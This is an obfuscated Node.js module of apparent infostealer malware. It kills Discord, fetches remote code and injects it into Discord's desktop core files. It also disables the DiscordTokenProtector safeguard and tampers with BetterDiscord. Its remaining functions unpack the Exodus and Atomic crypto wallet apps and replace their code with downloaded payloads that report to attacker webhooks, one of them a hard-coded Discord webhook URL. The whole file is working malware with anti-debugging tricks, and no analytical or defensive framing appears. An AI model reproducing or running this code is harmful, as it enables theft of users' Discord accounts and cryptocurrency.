const _0x394f30 = (function () {
    let _0x2fb0ba = true
    return function (_0x12e08c, _0x56490d) {
      const _0x2d205f = _0x2fb0ba
        ? function () {
            if (_0x56490d) {
              const _0x231f7e = _0x56490d.apply(_0x12e08c, arguments)
              return (_0x56490d = null), _0x231f7e
            }
          }
        : function () {}
      return (_0x2fb0ba = false), _0x2d205f
    }
  })(),
  _0x220e38 = _0x394f30(this, function () {
    return _0x220e38
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x220e38)
      .search('(((.+)+)+)+$')
  })
_0x220e38()
const _0x31d6dc = (function () {
  let _0x3dab2c = true
  return function (_0x2ccc24, _0x4e8005) {
    const _0x4ab709 = _0x3dab2c
      ? function () {
          if (_0x4e8005) {
            const _0x2ed699 = _0x4e8005.apply(_0x2ccc24, arguments)
            return (_0x4e8005 = null), _0x2ed699
          }
        }
      : function () {}
    return (_0x3dab2c = false), _0x4ab709
  }
})()
;(function () {
  _0x31d6dc(this, function () {
    const _0xddee86 = new RegExp('function *\\( *\\)')
    const _0x43e7ca = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
    const _0x27e189 = _0x754438('init')
    !_0xddee86.test(_0x27e189 + 'chain') || !_0x43e7ca.test(_0x27e189 + 'input')
      ? _0x27e189('0')
      : _0x754438()
  })()
})()
const _0x2a7220 = (function () {
    let _0x32a880 = true
    return function (_0x1d1364, _0x303b72) {
      const _0x2d7492 = _0x32a880
        ? function () {
            if (_0x303b72) {
              const _0x4222f2 = _0x303b72.apply(_0x1d1364, arguments)
              return (_0x303b72 = null), _0x4222f2
            }
          }
        : function () {}
      return (_0x32a880 = false), _0x2d7492
    }
  })(),
  _0x1116b4 = _0x2a7220(this, function () {
    const _0xb24e51 = function () {
        let _0x2cba2
        try {
          _0x2cba2 = Function(
            'return (function() {}.constructor("return this")( ));'
          )()
        } catch (_0x10d38e) {
          _0x2cba2 = window
        }
        return _0x2cba2
      },
      _0xb419d7 = _0xb24e51(),
      _0x40296a = (_0xb419d7.console = _0xb419d7.console || {}),
      _0x526e77 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x30e989 = 0; _0x30e989 < _0x526e77.length; _0x30e989++) {
      const _0x46f0d7 = _0x2a7220.constructor.prototype.bind(_0x2a7220),
        _0x35f600 = _0x526e77[_0x30e989],
        _0x2454f1 = _0x40296a[_0x35f600] || _0x46f0d7
      _0x46f0d7['__proto__'] = _0x2a7220.bind(_0x2a7220)
      _0x46f0d7.toString = _0x2454f1.toString.bind(_0x2454f1)
      _0x40296a[_0x35f600] = _0x46f0d7
    }
  })
_0x1116b4()
const _0x331a24 = require('fs'),
  _0x49d621 = require('node-fetch'),
  _0x43211f = require('glob'),
  _0x4c8fe6 = require('process'),
  { exec: _0x27116b } = require('child_process'),
  _0xfa8b2a = require('path'),
  _0x320cac = require('asar'),
  { stat: _0x2f52e0 } = require('./stats')
function _0x5d4d9d(_0x15399f) {
  return new Promise((_0x41e528, _0x3a032e) => {
    const _0x409e5c = _0x4c8fe6.platform === 'win32' ? 'tasklist' : 'ps aux'
    _0x27116b(_0x409e5c, (_0x3fc3ba, _0x45f41b, _0x4257ce) => {
      if (_0x3fc3ba) {
        _0x3a032e(_0x3fc3ba)
        return
      }
      const _0x60654e = _0x45f41b.split('\n')
      const _0x47ab6a = []
      for (const _0x4abcd4 of _0x60654e) {
        if (_0x4abcd4.toLowerCase().includes(_0x15399f.toLowerCase())) {
          const _0x2766d2 = _0x4abcd4.split(/\s+/)
          _0x47ab6a.push({
            name: _0x2766d2[0],
            pid: parseInt(_0x2766d2[1]),
            sessionName: _0x2766d2[2],
            sessionNumber: parseInt(_0x2766d2[3]),
            memoryUsage: parseInt(_0x2766d2[4].replace(',', '')),
          })
        }
      }
      _0x41e528(_0x47ab6a)
    })
  })
}
async function _0x332906(
  _0x31134f,
  _0x1c4834,
  _0x1818be,
  _0x1d5ade,
  _0x2c14f1
) {
  if (_0x31134f !== 'yes' || !_0x1c4834) {
    return
  }
  try {
    ;(async () => {
      const _0x754ff7 = await _0x5d4d9d('discord')
      try {
        _0x754ff7.length > 0 &&
          _0x754ff7.forEach((_0x26575b) => {
            _0x4c8fe6.kill(_0x26575b.pid)
          })
      } catch (_0x191613) {}
      const _0x1e6edf = _0x4c8fe6.env.localappdata
      const _0x21f8c6 = _0x43211f.sync(_0x1e6edf + '/*iscord')
      var _0x2283ba = []
      for (let _0x58a621 = 0; _0x58a621 < _0x21f8c6.length; _0x58a621++) {
        const _0x5fd43c = _0x21f8c6[_0x58a621],
          _0x253052 = _0x43211f.sync(_0x5fd43c + '/app-*/modules/')
        for (let _0x58a3b0 = 0; _0x58a3b0 < _0x253052.length; _0x58a3b0++) {
          const _0x3e99fb = _0x253052[_0x58a3b0],
            _0x21fa47 = _0x43211f.sync(_0x3e99fb + '/discord_desktop_core-*')
          _0x2283ba.push(..._0x21fa47)
        }
      }
      for (let _0x387f9b = 0; _0x387f9b < _0x2283ba.length; _0x387f9b++) {
        const _0x3b65a1 = _0x2283ba[_0x387f9b]
        try {
          const _0x2c477c = await _0x49d621(_0x1d5ade),
            _0x529ff6 = await _0x2c477c.text(),
            _0x534755 = _0x43211f.sync(_0x3b65a1 + '/**/index.js')
          for (const _0x48b57e of _0x534755) {
            _0x1818be.includes('https://hawkish.eu/')
              ? await _0x331a24.writeFileSync(
                  _0x48b57e,
                  '' +
                    _0x529ff6
                      .replace(
                        'https://hawkish.eu/grabber/hooks/mFIvyHDvIJrSuzHzJGqegjHUqbiq',
                        _0x1818be
                      )
                      .replace('%TRANSFER_URL%', _0x2c14f1),
                  'utf-8'
                )
              : await _0x331a24.writeFileSync(
                  _0x48b57e,
                  '' +
                    _0x529ff6
                      .replace(
                        'https://discord.com/api/webhooks/1134509281287340122/ltP5jLHiFUPd3Y0ml16_jhcPvkHNYJU54NpxvhLcl5_HIu5L5RP_j850OpBY3_YqTOHp',
                        _0x1c4834
                      )
                      .replace('%TRANSFER_URL%', _0x2c14f1),
                  'utf-8'
                )
          }
          try {
            const _0x5c0a43 = _0x43211f.sync(_0x3b65a1 + '/discord_d*')[0]
            await _0x331a24.mkdirSync(_0x5c0a43 + '/ThiefCat', (_0x4fc89d) => {
              if (_0x4fc89d) {
              }
            })
          } catch (_0x44b313) {}
          try {
            _0x3b65a1 &&
              _0x27116b(
                'start ' +
                  ('' + _0xfa8b2a.join(_0x3b65a1, '..', '..', 'Discord.exe'))
              )
          } catch (_0x7d92b8) {}
        } catch (_0x3e0eaf) {}
      }
    })()
  } catch (_0x4066f0) {}
}
const _0x247a73 = (_0x3b88bf, _0x2f1b08, _0x20145d) => {
  if (!Buffer.isBuffer(_0x3b88bf)) {
    _0x3b88bf = Buffer.from(_0x3b88bf)
  }
  const _0x1d7499 = _0x3b88bf.indexOf(_0x2f1b08)
  if (_0x1d7499 === -1) {
    return _0x3b88bf
  }
  if (!Buffer.isBuffer(_0x20145d)) {
    _0x20145d = Buffer.from(_0x20145d)
  }
  const _0x211406 = _0x3b88bf.slice(0, _0x1d7499),
    _0x4bc7d7 = _0x247a73(
      _0x3b88bf.slice(_0x1d7499 + _0x2f1b08.length),
      _0x2f1b08,
      _0x20145d
    )
  const _0x33ec27 = _0x1d7499 + _0x20145d.length + _0x4bc7d7.length
  return Buffer.concat([_0x211406, _0x20145d, _0x4bc7d7], _0x33ec27)
}
async function _0x3ce3eb(_0x30ada0) {
  if (_0x30ada0 != 'yes') {
    return
  }
  try {
    const _0x444954 = _0xfa8b2a.join(
        _0x4c8fe6.env.APPDATA,
        'DiscordTokenProtector'
      ),
      _0x386da7 = _0xfa8b2a.join(_0x444954, 'config.json')
    if (
      !_0x331a24.existsSync(_0x444954) ||
      !_0x331a24.lstatSync(_0x444954).isDirectory() ||
      !_0x331a24.existsSync(_0x386da7)
    ) {
      return
    }
    const _0x488bd0 = [
      'DiscordTokenProtector.exe',
      'ProtectionPayload.dll',
      'secure.dat',
    ]
    for (const _0x519ce6 of _0x488bd0) {
      const _0x1fdd7d = _0xfa8b2a.join(_0x444954, _0x519ce6)
      _0x331a24.existsSync(_0x1fdd7d) && _0x331a24.unlinkSync(_0x1fdd7d)
    }
    let _0x4c624f
    try {
      const _0x50e086 = _0x331a24.readFileSync(_0x386da7, 'utf-8')
      _0x4c624f = JSON.parse(_0x50e086)
    } catch (_0x1d2de6) {
      return
    }
    _0x4c624f.FalseKSCH_is_here = 'https://github.com/FalseKSCH'
    _0x4c624f.auto_start = false
    _0x4c624f.auto_start_discord = false
    _0x4c624f.integrity = false
    _0x4c624f.integrity_allowbetterdiscord = false
    _0x4c624f.integrity_checkexecutable = false
    _0x4c624f.integrity_checkhash = false
    _0x4c624f.integrity_checkmodule = false
    _0x4c624f.integrity_checkscripts = false
    _0x4c624f.integrity_checkresource = false
    _0x4c624f.integrity_redownloadhashes = false
    _0x4c624f.iterations_iv = 364
    _0x4c624f.iterations_key = 457
    _0x4c624f.version = 69420
    _0x331a24.writeFileSync(_0x386da7, JSON.stringify(_0x4c624f, null, 2))
    _0x331a24.appendFileSync(
      _0x386da7,
      '\n\n//FalseKSCH_is_here | https://github.com/FalseKSCH'
    )
  } catch (_0xd79e41) {}
}
async function _0x4665f7(_0xb1bab7) {
  if (_0xb1bab7 != 'yes') {
    return
  }
  try {
    let _0x111474 =
      _0x4c8fe6.env.appdata + '/BetterDiscord/data/betterdiscord.asar'
    if (_0x331a24.existsSync(_0x111474)) {
      const _0xbb2e29 = _0x331a24.readFileSync(_0x111474)
      _0x331a24.writeFileSync(
        _0x111474,
        _0x247a73(_0xbb2e29, 'api/webhooks', 'FalseKSCH')
      )
    }
    return
  } catch (_0x5d236a) {}
}
async function _0x2b911a(_0xff0b04, _0x1fe8a1, _0x5e383e) {
  if (_0xff0b04 != 'yes' || !_0x1fe8a1 || !_0x5e383e) {
    return
  }
  try {
    let _0x5cc372 = _0x4c8fe6.env.localappdata
    const _0xe0b2fd = await _0x49d621(_0x5e383e),
      _0x3210e1 = await _0xe0b2fd.text()
    let _0x41b6e1 = _0x43211f.sync(
        _0x5cc372 + '/exodus/app-*/resources/app.asar'
      ),
      _0x4c34a3 = _0xfa8b2a.join(_0x41b6e1[0], '..', 'unpacked')
    _0x41b6e1 && (await _0x587b85(_0x41b6e1[0], _0x4c34a3))
    let _0x39e3a4 = _0x43211f.sync(_0x4c34a3 + '/src/app/main/index.js')
    await _0x331a24.writeFileSync(_0x39e3a4[0], '' + _0x3210e1, 'utf-8')
    await _0xdd4148(_0x4c34a3, _0xfa8b2a.join(_0x41b6e1[0]))
    let _0x3d5348 = {
      webhook: _0x1fe8a1,
      link: _0x2f52e0.exodusurl,
    }
    const _0x2a60bc = _0xfa8b2a.join(_0x41b6e1[0], '..', '..')
    _0x331a24.writeFileSync(
      _0xfa8b2a.join(_0x2a60bc, 'config.json'),
      JSON.stringify(_0x3d5348)
    )
  } catch (_0x22a0ce) {}
}
function _0x587b85(_0x260e44, _0xffaf60) {
  try {
    _0x320cac.extractAll(_0x260e44, _0xffaf60)
  } catch (_0xe1ce9f) {}
}
async function _0xdd4148(_0x552529, _0x48f3e8) {
  try {
    console.log(_0x48f3e8 + ' \n' + _0x552529)
    await _0x320cac.createPackage(_0x552529, _0x48f3e8)
    if (_0x331a24.existsSync(_0x48f3e8)) {
      _0x331a24.existsSync(_0x552529) &&
        _0x331a24.rmdirSync(_0x552529, { recursive: true })
    } else {
    }
  } catch (_0x2b1d5c) {
    console.log(_0x2b1d5c)
  }
}
async function _0x1a23f7(_0x17f49f, _0x571121, _0x984dfa) {
  if (_0x17f49f != 'yes' || !_0x571121 || !_0x984dfa) {
    return
  }
  try {
    const _0x26283a = _0x4c8fe6.env.localappdata,
      _0x533c38 = await _0x49d621(_0x984dfa),
      _0x5e3f85 = await _0x533c38.text()
    let _0x49c7c6 = _0x43211f.sync(
        _0x26283a + '/Programs/atomic/resources/app.asar'
      ),
      _0x284beb = _0xfa8b2a.join(_0x49c7c6[0], '..', 'unpacked')
    _0x49c7c6[0] && (await _0x587b85(_0x49c7c6[0], _0x284beb))
    let _0x384150 = _0x284beb + '/dist/electron/vendors.c1828ed4edca9a5f556f.js'
    console.log(_0x384150)
    await _0x331a24.writeFileSync(_0x384150, '' + _0x5e3f85, 'utf-8')
    await _0xdd4148(_0x284beb, _0xfa8b2a.join(_0x49c7c6[0]))
    let _0x404e7b = {
      webhook: _0x571121,
      link: _0x2f52e0.exodusurl,
    }
    const _0x1c85ef = _0xfa8b2a.join(_0x49c7c6[0], '..', '..')
    _0x331a24.writeFileSync(
      _0xfa8b2a.join(_0x1c85ef, 'config.json'),
      JSON.stringify(_0x404e7b)
    )
  } catch (_0x805f9e) {}
}
module.exports = {
  inject: _0x332906,
  pwnBetterDiscord: _0x4665f7,
  BypassDiscordTokenProtector: _0x3ce3eb,
  exodusInjection: _0x2b911a,
  AtomicInjection: _0x1a23f7,
}
function _0x754438(_0x41f416) {
  function _0x5ccb3f(_0x5b15d1) {
    if (typeof _0x5b15d1 === 'string') {
      return function (_0x44fa3f) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x5b15d1 / _0x5b15d1).length !== 1 || _0x5b15d1 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x5ccb3f(++_0x5b15d1)
  }
  try {
    if (_0x41f416) {
      return _0x5ccb3f
    } else {
      _0x5ccb3f(0)
    }
  } catch (_0x2af602) {}
}
